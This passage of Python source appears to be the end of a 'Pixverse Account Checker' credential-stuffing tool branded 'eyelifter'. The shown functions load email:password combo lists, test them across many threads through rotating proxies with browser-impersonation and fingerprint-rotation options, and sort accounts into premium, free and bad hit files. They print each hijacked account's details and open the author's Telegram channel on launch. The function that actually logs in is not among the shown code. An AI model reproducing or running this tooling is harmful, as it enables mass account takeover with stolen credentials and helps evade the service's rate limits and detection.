    _EYELIFTER_STOP.clear()

    eyelifter_section("SINGLE CHECK [eyelifter]")
    combo = input(f"{eyelifter_color('96', '[*] email:password > ')}").strip()
    if ":" not in combo:
        eyelifter_log("✗", "ERROR", "INPUT", "invalid format [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    if not _EYELIFTER_FOLDER:
        root = os.path.join(os.path.dirname(EYELIFTER_CFG_PATH), EYELIFTER_RESULTS)
        os.makedirs(root, exist_ok=True)
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
        _EYELIFTER_FOLDER = os.path.join(root, f"Single_{ts}_{tag}")
        os.makedirs(_EYELIFTER_FOLDER, exist_ok=True)

    proxy = None
    if proxies:
        if not _EYELIFTER_POOL:
            _EYELIFTER_POOL = list(proxies)
            _EYELIFTER_BADP = set()
        proxy = eyelifter_pick_proxy()

    eyelifter_log("🔍", "STEP", "CHECK",
        f"checking {combo.split(':')[0]} [eyelifter]")
    t0 = time.time()
    result = eyelifter_run_retry(combo, proxy)
    el = time.time() - t0

    st = result.get("status")
    if st == "ok":
        m = result.get("meta") or {}
        vlabel = "💰 PREMIUM" if result.get("paid") else "🆓 FREE"
        rows = [
            ("Status", vlabel),
            ("Email", result.get("email")),
            ("Password", result.get("password")),
            ("Username", result.get("username") or "-"),
            ("Account ID", str(result.get("account_id") or "-")),
            ("Country", result.get("register_country") or "-"),
            ("Premium Type", str(m.get("premium_type"))),
            ("Plan", m.get("plan_name") or "-"),
            ("Subscription", str(m.get("subscription"))),
            ("Member Type", str(m.get("member_type"))),
            ("Credit Daily", str(m.get("credit_daily"))),
            ("Credit Monthly", str(m.get("credit_monthly"))),
            ("Credit Package", str(m.get("credit_package"))),
            ("Fast Quota", str(m.get("fast_quota"))),
            ("Renewal Credits", str(m.get("renewal_credits"))),
            ("Remaining Days", str(m.get("remaining_days"))),
        ]
        if result.get("hit_reasons"):
            rows.append(("Hit Reasons", ",".join(result["hit_reasons"])))
        rows += [
            ("Time", f"{el:.2f}s"),
            ("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"),
        ]
        eyelifter_summary(rows)
    elif st == "bad":
        eyelifter_log("✗", "ERROR", "RESULT",
            f"bad creds — {result.get('reason')} [eyelifter]")
    else:
        eyelifter_log("✗", "ERROR", "RESULT",
            f"{result.get('error_type', '')} [eyelifter]")

    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_bulk_check(proxies):
    global _EYELIFTER_TOTAL, _EYELIFTER_PREMIUM_F, _EYELIFTER_FREE_F
    global _EYELIFTER_BAD_F, _EYELIFTER_ERR_F, _EYELIFTER_FOLDER
    global _EYELIFTER_POOL, _EYELIFTER_BADP

    eyelifter_reset_stats()
    eyelifter_section("BULK CHECK [eyelifter]")

    path = input(f"{eyelifter_color('96', '[*] combo file > ')}").strip()
    if not path or not os.path.isfile(path):
        eyelifter_log("✗", "ERROR", "FILE", "not found [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    combos = eyelifter_extract_combos(content)
    if not combos:
        eyelifter_log("✗", "ERROR", "EXTRACT", "no valid combos [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    eyelifter_log("✓", "INFO", "EXTRACT",
                  f"{len(combos)} unique combos [eyelifter]")

    nt = eyelifter_ask_threads()
    if nt != _EYELIFTER_CFG.settings["threads"]:
        _EYELIFTER_CFG.settings["threads"] = nt
        try:
            _EYELIFTER_CFG.eyelifter_save()
        except Exception:
            pass
    eyelifter_log("⚙️", "INFO", "THREADS",
                  f"{_EYELIFTER_CFG.settings['threads']} [eyelifter]")

    root = os.path.join(os.path.dirname(EYELIFTER_CFG_PATH), EYELIFTER_RESULTS)
    os.makedirs(root, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _EYELIFTER_FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_EYELIFTER_FOLDER, exist_ok=True)

    try:
        (_EYELIFTER_PREMIUM_F, _EYELIFTER_FREE_F,
         _EYELIFTER_BAD_F, _EYELIFTER_ERR_F) = eyelifter_open_files(_EYELIFTER_FOLDER)
    except Exception as e:
        eyelifter_log("✗", "ERROR", "OPEN", f"{e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    header = (f"# Pixverse Checker by eyelifter - {datetime.now().isoformat()}\n"
              f"# Seal: {EYELIFTER_SEAL_STR}\n"
              f"# Credit: eyelifter | {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}\n\n")
    for fh in (_EYELIFTER_PREMIUM_F, _EYELIFTER_FREE_F,
               _EYELIFTER_BAD_F, _EYELIFTER_ERR_F):
        fh.write(header)

    _EYELIFTER_TOTAL = len(combos)
    eyelifter_log("📊", "INFO", "FILE", f"loaded {_EYELIFTER_TOTAL} [eyelifter]")

    if proxies:
        _EYELIFTER_POOL = list(proxies)
        _EYELIFTER_BADP = set()
        eyelifter_log("🌐", "INFO", "PROXY",
                      f"{len(proxies)} loaded [eyelifter]")
    else:
        _EYELIFTER_POOL = []
        _EYELIFTER_BADP = set()
        eyelifter_log("⚠️", "WARN", "PROXY", "direct connection [eyelifter]")

    _EYELIFTER_STOP.clear()
    eyelifter_log("🚀", "INFO", "START",
        f"firing {_EYELIFTER_TOTAL} combos across "
        f"{_EYELIFTER_CFG.settings['threads']} threads "
        f"| {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN} [eyelifter]")

    try:
        EyelifterRunner(combos).eyelifter_run()
    except KeyboardInterrupt:
        _EYELIFTER_STOP.set()
        eyelifter_log("🛑", "WARN", "STOP", "stopping... [eyelifter]")
    except Exception as e:
        eyelifter_log("✗", "ERROR", "RUN",
            f"{type(e).__name__}: {str(e)[:120]} [eyelifter]")
    finally:
        _EYELIFTER_STOP.set()
        time.sleep(0.3)
        for fh in (_EYELIFTER_PREMIUM_F, _EYELIFTER_FREE_F,
                   _EYELIFTER_BAD_F, _EYELIFTER_ERR_F):
            try:
                fh.close()
            except Exception:
                pass

    with _EYELIFTER_LK:
        snap = dict(_EYELIFTER_ST)

    for base, key in (
        ("pixverse_premium.txt", "premium"),
        ("pixverse_free.txt", "free"),
        ("pixverse_bad.txt", "bad"),
        ("pixverse_errors.txt", "errors"),
    ):
        old = os.path.join(_EYELIFTER_FOLDER, base)
        new = os.path.join(_EYELIFTER_FOLDER,
                           base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    eyelifter_log("💾", "INFO", "SAVE",
                  f"results → {_EYELIFTER_FOLDER} [eyelifter]")
    eyelifter_divider()
    el = time.time() - _EYELIFTER_START
    eyelifter_summary([
        ("Total", _EYELIFTER_TOTAL),
        ("PREMIUM", snap["premium"]),
        ("FREE", snap["free"]),
        ("Bad creds", snap["bad"]),
        ("Errors", snap["errors"]),
        ("Rate limited", snap["rl"]),
        ("Proxy fails", snap["pfails"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{_EYELIFTER_TOTAL / max(el, 0.001):.2f} combo/s"),
        ("Folder", _EYELIFTER_FOLDER),
        ("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"),
    ])
    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_settings_menu():
    eyelifter_section("SETTINGS [eyelifter]")
    s = _EYELIFTER_CFG.settings
    print(f"  [1]  Threads:              {s['threads']} (1-{EYELIFTER_MAX_THREADS})")
    print(f"  [2]  Timeout:              {s['timeout']}s")
    print(f"  [3]  Retries:              {s['retries']}")
    print(f"  [4]  Combo Delay:          {s['combo_delay']}s")
    print(f"  [5]  Proxies File:         {s['proxies_file']}")
    print(f"  [6]  Rate-limit Delay:     {s['rate_limit_delay']}s")
    print(f"  [7]  Skip Proxy Test:      {s['skip_proxy_test']}")
    print(f"  [8]  Rotate Impersonate:   {s['rotate_impersonate']}")
    print(f"  [9]  Rotate Fingerprint:   {s['rotate_fingerprint']}")
    print(f"  [10] Hit Spacer:           {s['hit_spacer']}")
    print(f"  [11] Debug:                {s['debug']}")
    print(f"  [0]  Back")

    ch = input(f"{eyelifter_color('96', '[*] select > ')}").strip()
    changed = False
    try:
        if ch == "1":
            s["threads"] = max(1, min(EYELIFTER_MAX_THREADS, int(input("threads: "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("timeout: "))))
            changed = True
        elif ch == "3":
            s["retries"] = max(0, min(5, int(input("retries: "))))
            changed = True
        elif ch == "4":
            s["combo_delay"] = max(0.0, min(60.0, float(input("combo delay: "))))
            changed = True
        elif ch == "5":
            v = input("proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "6":
            s["rate_limit_delay"] = max(1, min(120, int(input("rate-limit delay: "))))
            changed = True
        elif ch == "7":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "8":
            s["rotate_impersonate"] = not s["rotate_impersonate"]
            changed = True
        elif ch == "9":
            s["rotate_fingerprint"] = not s["rotate_fingerprint"]
            changed = True
        elif ch == "10":
            s["hit_spacer"] = not s["hit_spacer"]
            changed = True
        elif ch == "11":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        eyelifter_log("✗", "ERROR", "CONFIG", "invalid [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    if changed:
        try:
            _EYELIFTER_CFG.eyelifter_save()
            eyelifter_log("💾", "INFO", "CONFIG", "saved [eyelifter]")
        except Exception as e:
            eyelifter_log("!", "WARN", "CONFIG", f"{e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_open_channel():
    try:
        for cmd in ("termux-open-url", "xdg-open", "open"):
            if subprocess.run(["which", cmd], capture_output=True).returncode == 0:
                subprocess.Popen(
                    [cmd, f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL, start_new_session=True,
                    close_fds=True)
                return
        if os.name == "nt":
            os.startfile(f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}")
            return
        import webbrowser
        webbrowser.open(f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}")
    except Exception:
        pass


def eyelifter_main():
    eyelifter_verify("main")
    if _EYELIFTER_CFG.settings.get("open_channel_on_launch", True):
        threading.Thread(target=eyelifter_open_channel, daemon=True).start()

    eyelifter_banner(EYELIFTER_TOOL, "Pixverse Account Checker")
    eyelifter_log("📣", "INFO", "CREDIT",
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} [eyelifter]")
    eyelifter_log("🐛", "INFO", "DEBUG",
        f"{'ON' if _EYELIFTER_CFG.settings.get('debug') else 'OFF'} [eyelifter]")

    proxy_file = os.path.join(
        os.path.dirname(EYELIFTER_CFG_PATH),
        _EYELIFTER_CFG.settings.get("proxies_file", "proxies.txt"))
    proxies = eyelifter_load_proxies(proxy_file)
    if proxies and not _EYELIFTER_CFG.settings.get("skip_proxy_test", False):
        proxies = eyelifter_filter_proxies(proxies)
        eyelifter_log("✓", "INFO", "PROXY",
                      f"{len(proxies)} live [eyelifter]")

    while True:
        eyelifter_verify("menu")
        eyelifter_section(
            f"MAIN MENU · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} [eyelifter]")
        if proxies:
            eyelifter_log("🌐", "INFO", "PROXY",
                          f"{len(proxies)} proxies [eyelifter]")
        else:
            eyelifter_log("⚠️", "WARN", "PROXY", "direct [eyelifter]")
        print("[1] Single check")
        print("[2] Bulk check")
        print("[3] Settings")
        print("[4] Exit")
        ch = input(f"{eyelifter_color('93', '[*] select > ')}").strip()

        if ch == "1":
            eyelifter_single_check(proxies)
        elif ch == "2":
            _EYELIFTER_STOP.clear()
            eyelifter_bulk_check(proxies)
        elif ch == "3":
            eyelifter_settings_menu()
            proxies = eyelifter_load_proxies(proxy_file)
            if proxies and not _EYELIFTER_CFG.settings.get("skip_proxy_test", False):
                proxies = eyelifter_filter_proxies(proxies)
        elif ch == "4":
            print("Exiting...")
            break
        else:
            eyelifter_log("✗", "ERROR", "INPUT", "invalid choice [eyelifter]")


if __name__ == "__main__":
    try:
        eyelifter_main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"[FATAL] {type(e).__name__}: {e}")